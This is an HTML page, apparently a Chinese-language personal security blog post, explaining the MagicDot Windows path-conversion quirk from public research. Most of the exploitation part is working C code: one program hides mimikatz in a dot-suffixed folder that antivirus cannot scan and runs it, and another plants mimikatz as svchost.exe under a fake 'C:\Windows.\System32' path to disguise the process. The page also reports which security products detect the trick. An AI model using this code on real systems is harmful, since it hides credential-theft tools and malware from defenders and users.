@@ -1,0 +1,715 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言好久没有写文章了，主播最近在持续学习当中，有些知识点还没有掌握，也没有自己更深的理解，所以写不出来什么东西，只能借着一些大佬的博客或者是公众号来写一点东西吧。 magicdot的介绍magicdot是SafeBreach Labs 的一位研究人员在 BlackHat Asia 2024 大会上以 “MagicDot: A Hacker’s Magic Show of Disappearing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《magicdot-ring3层的仿rootkit功能》">
+<meta property="og:url" content="http://example.com/2025/12/22/%E3%80%8Amagicdot-ring3%E5%B1%82%E7%9A%84%E4%BB%BFrootkit%E5%8A%9F%E8%83%BD%E3%80%8B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言好久没有写文章了，主播最近在持续学习当中，有些知识点还没有掌握，也没有自己更深的理解，所以写不出来什么东西，只能借着一些大佬的博客或者是公众号来写一点东西吧。 magicdot的介绍magicdot是SafeBreach Labs 的一位研究人员在 BlackHat Asia 2024 大会上以 “MagicDot: A Hacker’s Magic Show of Disappearing">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221631619.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221636478.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221637890.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221638664.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221638990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221645186.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221640186.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221641386.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221642008.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221700888.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221706310.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221711004.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221722981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221725937.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221734917.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221736078.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221737961.png">
+<meta property="article:published_time" content="2025-12-22T08:18:11.000Z">
+<meta property="article:modified_time" content="2025-12-22T09:42:53.346Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Windows操作系统">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221631619.png">
+  
+  
+  
+  <title>《magicdot-ring3层的仿rootkit功能》 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yawataa</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/sun.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="《magicdot-ring3层的仿rootkit功能》"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-22 16:18" pubdate>
+          December 22, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">《magicdot-ring3层的仿rootkit功能》</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久没有写文章了，主播最近在持续学习当中，有些知识点还没有掌握，也没有自己更深的理解，所以写不出来什么东西，只能借着一些大佬的博客或者是公众号来写一点东西吧。</p>
+<h1 id="magicdot的介绍"><a href="#magicdot的介绍" class="headerlink" title="magicdot的介绍"></a>magicdot的介绍</h1><p>magicdot是SafeBreach Labs 的一位研究人员在 BlackHat Asia 2024 大会上以 “MagicDot: A Hacker’s Magic Show of Disappearing Dots and Spaces” 为题进行了展示，MagicDot 的核心目的是利用文件系统中的特殊命名规则，创建无法正常操作的文件或目录，甚至隐藏文件，以实现安全研究的目的。</p>
+<p>这里是大佬的文章地址:</p>
+<p><a target="_blank" rel="noopener" href="https://www.safebreach.com/blog/magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces/">MagicDot：黑客魔术表演 |安全突破</a></p>
+<h1 id="原理和演示"><a href="#原理和演示" class="headerlink" title="原理和演示"></a>原理和演示</h1><p>这个漏洞的核心原理就是，当用户在 Windows 中执行带有路径参数的函数时，文件或文件夹所在的 DOS 路径会被转换为 NT 路径。在此转换过程中，存在一个已知问题：函数会移除任意路径元素的尾部点和最后一个路径元素的尾部空格。并且Windows 中的大多数用户空间 API都有这个问题。</p>
+<p>DOS 路径：<code>C:\example\example</code></p>
+<p>NT 路径：<code>\??\C:\example\example</code></p>
+<p>比如:当调用<em>像 CreateFile 这样的 win32api</em> 函数时，它实际上调用了另一个底层函数——<em>NtCreateFile</em> 函数——来执行打开文件的作。 由于 <em>NtCreateFile</em> 要求的是 NT 路径而非 DOS 路径，因此在调用 <em>NtCreateFile</em> 之前，DOS 路径会被转换为 NT 路径，NT 路径与 DOS 路径不同（例如 \？？\C：\Users\User\Documents\example.txt）。一组转换函数，大多数（如果不是全部）转换都会经过（<em>RtlpDosPathNameToRelativeNtPathName），</em> 负责这次转换。在转换过程中，存在一个已知问题，函数会移除任何路径元素的尾部点和最后一个路径元素的尾部空格，这就称之为“MagicDot”路径。以下是该转换过程的一些示例： </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221631619.png" srcset="/img/loading.gif" lazyload alt="image-20251222163133536"></p>
+<p>根据这个可以看出来，他会将dos路径中 </p>
+<p>• 任意路径段末尾的任意数量的点</p>
+<p>• 最后一个路径段末尾的任意数量的空格</p>
+<p>进行删除转换为nt路径</p>
+<p>我们可以尝试演示一下。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	HANDLE h=<span class="hljs-built_in">CreateFileW</span>(<span class="hljs-string">L&quot;\\??\\D:\\yawataa_magicdot.txt.&quot;</span>, GENERIC_READ, FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,<span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span>(h==INVALID_HANDLE_VALUE)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-]CreateFileW Error %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]CreateFileW Success\n&quot;</span>);<br><br>	<span class="hljs-type">int</span> c=<span class="hljs-built_in">CreateDirectoryW</span>(<span class="hljs-string">L&quot;\\??\\D:\\yawataa_magicdotDirectory.&quot;</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span>(c==<span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-]CreateDirectoryW Error %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]CreateDirectoryW Success\n&quot;</span>);<br><br>	<span class="hljs-built_in">CloseHandle</span>(h);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这串代码创建的一个路径D:\yawataa_magicdot.txt. 文件和D:\yawataa_magicdotDirectory. 文件目录，我们尝试运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221636478.png" srcset="/img/loading.gif" lazyload alt="image-20251222163624446"></p>
+<p>可以看到已经创建成功了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221637890.png" srcset="/img/loading.gif" lazyload alt="image-20251222163730858"></p>
+<p>但是当我们访问的时候，不能正常访问，也不能进行删除</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221638664.png" srcset="/img/loading.gif" lazyload alt="image-20251222163810639"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221638990.png" srcset="/img/loading.gif" lazyload alt="image-20251222163851953"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221645186.png" srcset="/img/loading.gif" lazyload alt="image-20251222164524154"></p>
+<p>这就是因为在解析的时候把最后的那个.去掉了，现在我们在目录下创建一个这个文件夹D:\yawataa_magicdotDirectory(没有点)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221640186.png" srcset="/img/loading.gif" lazyload alt="image-20251222164023160"></p>
+<p>里面放入test.txt文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221641386.png" srcset="/img/loading.gif" lazyload alt="image-20251222164132356"></p>
+<p>我们再访问</p>
+<p>D:\yawataa_magicdotDirectory.  这个文件夹 就会被解析导向到D:\yawataa_magicdotDirectory 这个文件夹下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221642008.png" srcset="/img/loading.gif" lazyload alt="image-20251222164236977"></p>
+<p>由此就引申出两个比较常用的利用手法。</p>
+<h2 id="1-文件隐藏"><a href="#1-文件隐藏" class="headerlink" title="1.文件隐藏"></a>1.文件隐藏</h2><p>我们可以创建一个magicdot文件夹，里面放我们的恶意程序。然后因为路径转换的问题，我们并不能打开这个文件夹。同时也不能进行删除(2025年12月22日可以防火绒)</p>
+<p>比如我们以mimikatz为例</p>
+<p>代码</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include&lt;windows.h&gt;</span><br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><br>int <span class="hljs-title function_">main</span>()<br>&#123;<br><br>	int <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">CreateDirectory</span>W(<span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>D:<span class="hljs-char escape_">\\</span>exp_dot.&quot;</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">c</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[-]CreateDirectoryW Error %d<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-title class_">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[+]CreateDirectoryW Success<span class="hljs-char escape_">\n</span>&quot;</span>);<br><br>	int <span class="hljs-variable">co</span><span class="hljs-operator">=</span><span class="hljs-title class_">CopyFile</span>W(<span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>D:<span class="hljs-char escape_">\\</span>mimikatz.exe&quot;</span>, <span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>D:<span class="hljs-char escape_">\\</span>exp_dot.<span class="hljs-char escape_">\\</span>mimikatz.exe&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">co</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[-]CopyFileW Error %d<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-title class_">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br><br>    <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[+]CopyFileW Success<span class="hljs-char escape_">\n</span>&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221700888.png" srcset="/img/loading.gif" lazyload alt="image-20251222170032828"></p>
+<p>扫描时因为不能访问这个文件夹 所以不能扫到东西。但是我们可以通过Windows api进行访问和执行</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	STARTUPINFOW si;<br>    PROCESS_INFORMATION pi;<br><br>	<span class="hljs-built_in">CreateProcessW</span>(<span class="hljs-string">L&quot;\\??\\D:\\exp_dot.\\mimikatz.exe&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221706310.png" srcset="/img/loading.gif" lazyload alt="image-20251222170635268"></p>
+<p>火绒2025年12月12日可以进行删除了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221711004.png" srcset="/img/loading.gif" lazyload alt="image-20251222171128899"></p>
+<h2 id="2-进程伪装"><a href="#2-进程伪装" class="headerlink" title="2.进程伪装"></a>2.进程伪装</h2><p>因此又产生了第二个利用点，就是进程伪装</p>
+<p>比如我们创建一个</p>
+<p>“C:\Windows.\System32”</p>
+<p>文件夹，当我们访问的时候就会被导入</p>
+<p>“C:\Windows\System32”中</p>
+<p>我们再在</p>
+<p>“C:\Windows.\System32”里面放入我们的恶意程序，命名为svchost.exe，就会被误认为是C:\Windows\System32下的这个svchost.exe在运行</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include&lt;windows.h&gt;</span><br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><br>int <span class="hljs-title function_">main</span>()<br>&#123;<br>	int <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">CreateDirectory</span>W(<span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>C:<span class="hljs-char escape_">\\</span>Windows.&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">c1</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[-]CreateDirectoryW Error %d<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-title class_">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	int <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">CreateDirectory</span>W(<span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>C:<span class="hljs-char escape_">\\</span>Windows.<span class="hljs-char escape_">\\</span>System32&quot;</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">c2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[-]CreateDirectoryW Error %d<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-title class_">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[+]CreateDirectoryW Success<span class="hljs-char escape_">\n</span>&quot;</span>);<br><br>	int <span class="hljs-variable">co</span><span class="hljs-operator">=</span><span class="hljs-title class_">CopyFile</span>W(<span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>D:<span class="hljs-char escape_">\\</span>mimikatz.exe&quot;</span>, <span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>C:<span class="hljs-char escape_">\\</span>Windows.<span class="hljs-char escape_">\\</span>System32<span class="hljs-char escape_">\\</span>svchost.exe&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">co</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[-]CopyFileW Error %d<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-title class_">GetLastError</span>());<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br><br>    <span class="hljs-title function_">printf</span>(<span class="hljs-string">&quot;[+]CopyFileW Success<span class="hljs-char escape_">\n</span>&quot;</span>);<br>  <br>	<span class="hljs-variable">STARTUPINFOW</span> <span class="hljs-variable">si</span>;<br>	<span class="hljs-variable">PROCESS_INFORMATION</span> <span class="hljs-variable">pi</span>;<br><br>	<span class="hljs-title class_">CreateProcess</span>W(<span class="hljs-variable">L</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>??<span class="hljs-char escape_">\\</span>C:<span class="hljs-char escape_">\\</span>Windows.<span class="hljs-char escape_">\\</span>System32<span class="hljs-char escape_">\\</span>svchost.exe&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">NULL</span>, <span class="hljs-variable">NULL</span>, <span class="hljs-variable">FALSE</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">NULL</span>, <span class="hljs-variable">NULL</span>, <span class="hljs-operator">&amp;</span><span class="hljs-variable">si</span>, <span class="hljs-operator">&amp;</span><span class="hljs-variable">pi</span>);<br>	<span class="hljs-title class_">WaitForSingleObject</span>(<span class="hljs-variable">pi</span>.<span class="hljs-property">hProcess</span>, <span class="hljs-variable">INFINITE</span>);<br>	<span class="hljs-title class_">CloseHandle</span>(<span class="hljs-variable">pi</span>.<span class="hljs-property">hProcess</span>);<br><br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <br>	<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221722981.png" srcset="/img/loading.gif" lazyload alt="image-20251222172231928"></p>
+<p>此时查看进程29000</p>
+<p>此时procexp能够正常检测到该进程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221725937.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221734917.png" srcset="/img/loading.gif" lazyload alt="image-20251222173403863"></p>
+<p>但是Processhacker和系统自带的进程查看，关于这个进程的描述就是正常的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221736078.png" srcset="/img/loading.gif" lazyload alt="image-20251222173621047"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202512221737961.png" srcset="/img/loading.gif" lazyload alt="image-20251222173753902"></p>
+<p>参考链接:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SafeBreach-Labs/MagicDot">https://github.com/SafeBreach-Labs/MagicDot</a></p>
